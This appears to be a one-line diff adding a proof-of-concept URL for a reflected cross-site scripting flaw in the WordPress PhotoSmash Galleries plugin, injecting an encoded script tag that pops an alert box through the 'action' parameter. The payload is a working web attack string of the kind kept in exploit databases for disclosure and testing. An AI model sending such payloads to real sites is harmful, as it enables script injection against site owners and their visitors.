@@ -1,0 +1,1 @@
+http://www.example.com/wp-content/plugins/photosmash-galleries/index.php?action=%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
